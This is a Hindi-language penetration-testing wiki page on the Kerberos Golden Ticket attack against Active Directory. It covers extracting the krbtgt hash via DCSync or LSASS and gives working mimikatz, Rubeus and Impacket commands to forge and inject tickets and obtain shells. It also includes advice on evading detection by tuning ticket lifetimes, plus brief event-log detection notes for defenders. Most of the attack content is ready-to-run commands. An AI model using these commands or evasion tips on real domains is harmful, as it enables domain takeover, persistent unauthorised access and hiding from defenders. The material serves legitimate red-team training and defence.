# Golden Ticket

{{#include ../../banners/hacktricks-training.md}}

## Golden ticket

एक **Golden Ticket** हमला **किसी भी उपयोगकर्ता का अनुकरण करते हुए एक वैध Ticket Granting Ticket (TGT) बनाने** पर आधारित है, जो **Active Directory (AD) krbtgt खाते के NTLM हैश** का उपयोग करता है। यह तकनीक विशेष रूप से फायदेमंद है क्योंकि यह **अनुकरण किए गए उपयोगकर्ता के रूप में डोमेन के भीतर किसी भी सेवा या मशीन तक पहुंच** की अनुमति देती है। यह याद रखना महत्वपूर्ण है कि **krbtgt खाते के क्रेडेंशियल्स कभी स्वचालित रूप से अपडेट नहीं होते**।

**krbtgt खाते का NTLM हैश प्राप्त करने के लिए**, विभिन्न विधियों का उपयोग किया जा सकता है। इसे **Local Security Authority Subsystem Service (LSASS) प्रक्रिया** या **NT Directory Services (NTDS.dit) फ़ाइल** से निकाला जा सकता है, जो डोमेन के भीतर किसी भी Domain Controller (DC) पर स्थित है। इसके अलावा, **DCsync हमले को निष्पादित करना** इस NTLM हैश को प्राप्त करने की एक और रणनीति है, जिसे **Mimikatz में lsadump::dcsync मॉड्यूल** या **Impacket द्वारा secretsdump.py स्क्रिप्ट** का उपयोग करके किया जा सकता है। यह महत्वपूर्ण है कि इन कार्यों को करने के लिए **डोमेन प्रशासनिक विशेषाधिकार या समान स्तर की पहुंच की आवश्यकता होती है**।

हालांकि NTLM हैश इस उद्देश्य के लिए एक व्यवहार्य विधि के रूप में कार्य करता है, लेकिन **संचालन सुरक्षा कारणों से** **Advanced Encryption Standard (AES) Kerberos कुंजी (AES128 और AES256) का उपयोग करके टिकटों को बनाना** **काफी अनुशंसित** है।
```bash:From Linux
python ticketer.py -nthash 25b2076cda3bfd6209161a6c78a69c1c -domain-sid S-1-5-21-1339291983-1349129144-367733775 -domain jurassic.park stegosaurus
export KRB5CCNAME=/root/impacket-examples/stegosaurus.ccache
python psexec.py jurassic.park/stegosaurus@lab-wdc02.jurassic.park -k -no-pass
```

```bash:From Windows
#mimikatz
kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt
.\Rubeus.exe ptt /ticket:ticket.kirbi
klist #List tickets in memory

# Example using aes key
kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /aes256:430b2fdb13cc820d73ecf123dddd4c9d76425d4c2156b89ac551efb9d591a439 /ticket:golden.kirbi
```
**एक बार** जब आप **गोल्डन टिकट इंजेक्ट** कर लेते हैं, तो आप साझा फ़ाइलों **(C$)** तक पहुँच सकते हैं, और सेवाओं और WMI को निष्पादित कर सकते हैं, इसलिए आप **psexec** या **wmiexec** का उपयोग करके एक शेल प्राप्त कर सकते हैं (ऐसा लगता है कि आप winrm के माध्यम से शेल प्राप्त नहीं कर सकते)।

### सामान्य पहचान को बायपास करना

गोल्डन टिकट का पता लगाने के सबसे सामान्य तरीके **केर्बेरोस ट्रैफ़िक** की जांच करना हैं। डिफ़ॉल्ट रूप से, Mimikatz **TGT को 10 वर्षों के लिए साइन** करता है, जो इसके साथ किए गए बाद के TGS अनुरोधों में असामान्य के रूप में सामने आएगा।

`Lifetime : 3/11/2021 12:39:57 PM ; 3/9/2031 12:39:57 PM ; 3/9/2031 12:39:57 PM`

शुरुआत ऑफ़सेट, अवधि और अधिकतम नवीनीकरण (सभी मिनटों में) को नियंत्रित करने के लिए `/startoffset`, `/endin` और `/renewmax` पैरामीटर का उपयोग करें।
```
Get-DomainPolicy | select -expand KerberosPolicy
```
दुर्भाग्यवश, TGT का जीवनकाल 4769 में लॉग नहीं किया गया है, इसलिए आप यह जानकारी Windows इवेंट लॉग में नहीं पाएंगे। हालाँकि, आप जो सहसंबंधित कर सकते हैं वह है **4769 को बिना पूर्व 4768 के देखना**। यह **TGT के बिना TGS का अनुरोध करना संभव नहीं है**, और यदि TGT जारी होने का कोई रिकॉर्ड नहीं है, तो हम यह निष्कर्ष निकाल सकते हैं कि इसे ऑफ़लाइन तैयार किया गया था।

इस **पता लगाने से बचने** के लिए हीरे के टिकटों की जांच करें:

{{#ref}}
diamond-ticket.md
{{#endref}}

### शमन

- 4624: खाता लॉगिन
- 4672: प्रशासनिक लॉगिन
- `Get-WinEvent -FilterHashtable @{Logname='Security';ID=4672} -MaxEvents 1 | Format-List –Property`

रक्षा करने वालों के लिए अन्य छोटे ट्रिक्स हैं **संवेदनशील उपयोगकर्ताओं के लिए 4769 पर अलर्ट करना** जैसे कि डिफ़ॉल्ट डोमेन प्रशासक खाता।

## संदर्भ

- [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-golden-tickets] (https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-golden-tickets)

{{#include ../../banners/hacktricks-training.md}}
